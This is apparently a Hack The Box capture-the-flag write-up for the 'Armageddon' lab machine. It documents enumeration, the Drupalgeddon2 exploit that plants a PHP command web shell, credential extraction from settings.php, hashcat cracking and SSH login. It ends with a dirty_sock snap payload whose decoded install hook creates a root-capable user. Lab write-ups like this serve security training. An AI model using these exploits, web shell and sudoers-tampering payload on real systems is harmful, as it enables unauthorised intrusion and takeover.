@@ -1,0 +1,368 @@
+# Discovery
+## Trusty NMAP Scan:
+```bash
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# nmap -sC -sV 10.10.10.233 > nmap.txt 
+```
+
+```bash
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# cat nmap.txt                                                           1 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 21:33 MDT
+Nmap scan report for 10.10.10.233
+Host is up (0.065s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
+```
+
+## Wappalyzer / GoBuster
+Checking the site we have a login page. Wappalyzer does some of the heavy lifting for us:
+![[Pasted image 20210422214450.png]]
+
+Queued up gobuster for directory enumeration in the background:
+```bash
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# gobuster dir -u http://10.10.10.233/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster.txt
+
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# cat gobuster.txt
+/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]
+/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/]
+/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
+/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
+/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/]
+/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
+/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
+```
+
+Began researching Drupal, PHP, and Apache vulnerabilities and exploits based on wappalyzer findings. The exploits for Drupal are particularly interesting, namely because they include 'armageddon' *hint hint*. CMS is typically a great point of entry as it is the most 'web-facing' component of any webapp/website (obviously) but also because patches seem to get neglected regularly.
+![[Pasted image 20210427204004.png]]
+
+We will avoid the metasploit version for now, to see if I can make my way throug without it. I've chosen to use CVE [2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) from [exploit-db](https://www.exploit-db.com/exploits/44449).
+
+# Exploitation
+## CVE-2018-7600
+Cloned the files from git:
+```bash
+┌──(root💀kali)-[/home/…/Documents/HTB/arma/ruby]
+└─# git clone https://github.com/dreadlocked/Drupalgeddon2.git
+Cloning into 'Drupalgeddon2'...
+remote: Enumerating objects: 257, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (4/4), done.
+remote: Total 257 (delta 0), reused 0 (delta 0), pack-reused 253
+Receiving objects: 100% (257/257), 102.12 KiB | 786.00 KiB/s, done.
+Resolving deltas: 100% (88/88), done.
+```
+
+I did hit the highline dependency failure as detailed in the readme, and had to install this gem:
+```bash
+┌──(root💀kali)-[/home/…/HTB/arma/ruby/Drupalgeddon2]
+└─# sudo gem install highline     
+Fetching highline-2.0.3.gem
+Successfully installed highline-2.0.3
+Parsing documentation for highline-2.0.3
+Installing ri documentation for highline-2.0.3
+Done installing documentation for highline after 2 seconds
+1 gem installed
+```
+
+Exploitation completed, and I now have a low-level shell as user (or, I suppose service) 'apache'
+```bash
+┌──(root💀kali)-[/home/…/HTB/arma/ruby/Drupalgeddon2]
+└─# ruby drupalgeddon2.rb http://10.10.10.233/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://10.10.10.233/
+--------------------------------------------------------------------------------
+[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.56
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo XYJMXTAZ
+[+] Result : XYJMXTAZ
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+[i] Response: HTTP 404 // Size: 5
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
+armageddon.htb>> whoami
+apache
+armageddon.htb>> 
+```
+
+I can't run anything, sudo -l, cd, nothing. What the hell even is this?
+```bash
+armageddon.htb>> echo $TERM
+dumb
+armageddon.htb>> 
+```
+
+## Drupal
+Performed some research regarding the apache service account, what I can and can't do, as well as a rudementary google search of 'where does drupal store passwords' and came across this article on [Drupal.org](https://www.drupal.org/forum/support/post-installation/2017-01-13/where-are-the-database-username-and-password-stored). I can see as far down as 'sites', but cannot 'cd' around. Checking permissions down the structure a bit I see I do have read access to that settings.php file:
+```bash
+armageddon.htb>> ls -al sites/default
+total 56
+dr-xr-xr-x. 3 apache apache    67 Dec  3 12:30 .
+drwxr-xr-x. 4 apache apache    75 Jun 21  2017 ..
+-rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
+drwxrwxr-x. 3 apache apache    37 Dec  3 12:32 files
+-r--r--r--. 1 apache apache 26565 Dec  3 12:32 settings.php
+armageddon.htb>>
+```
+
+Cat'd it out and started digging, really the only items of interest appeared to be this 'drupaluser', with a plain text password, pointing to localhost, with a database of 'drupal' for mysql:
+```php
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+```
+
+## mySQL
+Admittedly, I haven't had to connect to mySQL via CLI in awhile and had to review syntax from [Dev.Mysql.com](https://dev.mysql.com/doc/refman/8.0/en/connecting.html).
+Attempts to connect to mysql from my attack-box proved that I could not connect from here to there, but this should have been obvious as our nmap scans didn't pick up mysql services running outward.
+So what can I do here. I ran the command locally, successfully connected and was provided the man page, but wasn't connected to the mysql client. I'm dropped back to the apache service account:
+```bash
+armageddon.htb>> mysql -h localhost -u drupaluser -p CQHEy@9M*m23gBVj drupal
+mysql  Ver 15.1 Distrib 5.5.68-MariaDB, for Linux (x86_64) using readline 5.1
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+```
+
+Fortunately, the man page was in my face enough to notice that I can execute command via one-liners with the -e switch, so we'll try to figure out if there's an actual user I can connect with to mySQL instead of this apache service (though, it will still need to be locally, as the port isn't open externally).
+
+!!! Careful with syntax here, -p switch requires the password to be on top of it e.g. -pPassword
+
+This BS with the password needing to be right up on the -p switch caught me off guard for a little bit and required a re-read of the dev.mysql.com page I mentioned previously:
+```bash
+armageddon.htb>> mysql -h localhost -u drupaluser -p CQHEy@9M*m23gBVj -D drupal -e "show tables like 'users';"
+Enter password: ERROR 1045 (28000): Access denied for user 'drupaluser'@'localhost' (using password: NO)
+armageddon.htb>> mysql -h localhost -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e "show tables like 'users';"
+```
+
+!! For a cheat sheet of mysql commands check this link: [MySQL Commands](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
+
+Bruce, the real admin, is present:
+```bash
+armageddon.htb>> mysql -h localhost -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select * from users;'
+uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
+0						NULL	0	0	0	0	NULL		0		NULL
+1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
+```
+
+## Password Cracking / HashCat
+I dug myself into a bit of a hole here. My research began with 'what method does mySQL use for password hashing', where I began attempting to crack this password against a SHA1 hashing mode. This was probably not the correct way to go about this, as the [hashcat mode list](https://hashcat.net/wiki/doku.php?id=example_hashes) clearly has one for Drupal 7 specifically. Lesson learned there, the CMS is potentially providing the password hashing mechanisms, despite the back-end database 'holding' them.
+
+Frustration aside, I was able to use hashcat to crack the password:
+```bash
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# hashcat -m 7900 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-AMD Ryzen 9 3900X 12-Core Processor, 5844/5908 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+* (null)
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Drupal7
+```
+
+SSH'd into the box using these credentials successfully:
+```bash
+┌──(root💀kali)-[/home/ghohst/Documents/HTB/arma]
+└─# ssh brucetherealadmin@10.10.10.233                                                                                                       130 ⨯
+The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
+ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
+brucetherealadmin@10.10.10.233's password: 
+Last login: Wed Apr 28 04:17:28 2021 from 10.10.14.90
+[brucetherealadmin@armageddon ~]$ whoami
+brucetherealadmin
+[brucetherealadmin@armageddon ~]$ 
+```
+
+# Privelege Escalation
+Starting with the most obvious, what can I run as root?
+```bash
+[brucetherealadmin@armageddon ~]$ sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
+    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
+    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
+    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+```
+
+The answer is, snap. What version of snap are we running?
+```bash
+[brucetherealadmin@armageddon ~]$ snap version
+snap    2.47.1-1.el7
+snapd   2.47.1-1.el7
+series  16
+centos  7
+kernel  3.10.0-1160.6.1.el7.x86_64
+```
+
+# Failed Privelege Escalation
+## CVE-2019-7304
+Searching for Snap Vulnerabilities, we identify [this article](https://www.helpnetsecurity.com/2019/02/13/cve-2019-7304/) pointing us to this CVE-2019-7304, leading to a [github repository](https://github.com/initstring/dirty_sock) containing a python script for exploitation.
+Using version2 (which does not require registering an account and a private key) results in the following:
+```bash
+[brucetherealadmin@armageddon ~]$ python3 ./dirty.py 
+
+      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
+      |  \ | |__/  |   \_/      [__  |  | |    |_/  
+      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
+                       (version 2)
+
+//=========[]==========================================\\
+|| R&D     || initstring (@init_string)                ||
+|| Source  || https://github.com/initstring/dirty_sock ||
+|| Details || https://initblog.com/2019/dirty-sock     ||
+\\=========[]==========================================//
+
+
+[+] Slipped dirty sock on random socket file: /tmp/fiubkijzdl;uid=0;
+[+] Binding to socket file...
+[+] Connecting to snapd API...
+[+] Deleting trojan snap (and sleeping 5 seconds)...
+[!] System may not be vulnerable, here is the API reply:
+
+
+HTTP/1.1 401 Unauthorized
+Content-Type: application/json
+Date: Fri, 30 Apr 2021 00:34:13 GMT
+Content-Length: 119
+
+{"type":"error","status-code":401,"status":"Unauthorized","result":{"message":"access denied","kind":"login-required"}}
+```
+
+So why did this fail? from the repoistory we see:
+>Ubuntu comes with snapd by default, but any distribution should be exploitable if they have this package installed. You can easily check if your system is vulnerable. Run the command below. If your `snapd` is 2.37.1 or newer, you are safe.
+
+Reading further we find that version2 automatically upgrades the snap version shortly after running, so my machine is not necessarily vulnerable. First thought was to reset the machine, but even after a reset the version is still at 2.47.1.
+
+Where does that leave us? Well - we know we can install snaps, so perhaps we need to 'craft' our own snap containing the payload to then execute? 
+
+From the dirty sock python script, we pull the Base64 encoded Trojan_Snap:
+```bash
+# The following global is a base64 encoded string representing an installable
+# snap package. The snap itself is empty and has no functionality. It does,
+# however, have a bash-script in the install hook that will create a new user.
+# For full details, read the blog linked on the github page above.
+TROJAN_SNAP = ('''
+aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
+               + 'A' * 4256 + '==')
+			   
+```
+
+Convert it to review the code itself:
+```bash
+┌──(ghohst㉿kali)-[~/Documents/HTB/arma/dirty_sock]
+└─$ python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d
+hsqs!V\�������������>x#!/bin/bash
+
+useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
+usermod -aG sudo dirty_sock
+echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
+name: dirty-sock
+version: '0.1'
+summary: Empty snap, used for exploit
+description: 'See https://github.com/initstring/dirty_sock
+
+  '
+architectures:
+- amd64
+confinement: devmode
+grade: devel
+```
+
+
+
